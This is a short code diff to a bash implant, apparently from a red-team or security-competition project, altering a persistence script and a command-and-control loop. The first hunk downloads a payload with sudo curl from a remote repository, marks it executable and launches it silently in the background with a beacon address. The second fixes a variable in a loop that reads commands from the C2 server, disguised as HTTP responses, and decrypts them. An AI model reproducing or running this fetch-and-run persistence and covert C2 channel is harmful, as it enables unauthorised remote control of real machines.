@@ -30,7 +30,7 @@ if [ ! -f "$backup_script" ]; then
 if [ ! -f "$main_payload" ]; then
   sudo curl -o "$main_payload" "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads"
   sudo chmod +x "$main_payload"
-  sudo nohup bash "$main_payload" -BeaconIPAddress "$beaconIPAddress" &
+  sudo -b nohup "$main_payload $beaconIPAddress" >/dev/null 2>&1
 fi
 EOF
   sudo chmod +x "$backup_script"
@@ -72,7 +72,7 @@ while true; do
   # Read command from the C2
   if read -t 1 command <&3; then
     # Remove /r from the end of each line.
-    comand=$(echo "$command" | tr -d '\r')
+    command=$(echo "$command" | tr -d '\r')
     # Because we are disguising this in an HTTP packet, there are a bunch of lines we don't care about
     if [[ "$command" != "HTTP/1.1 200 OK" ]] && [[ "$command" != "Content-Length"* ]] && [[ "$command" != "Content-Type: text/plain; charset=utf-8" ]] && [[ -n "$command" ]]; then
       # Convert Cipher text to plain text
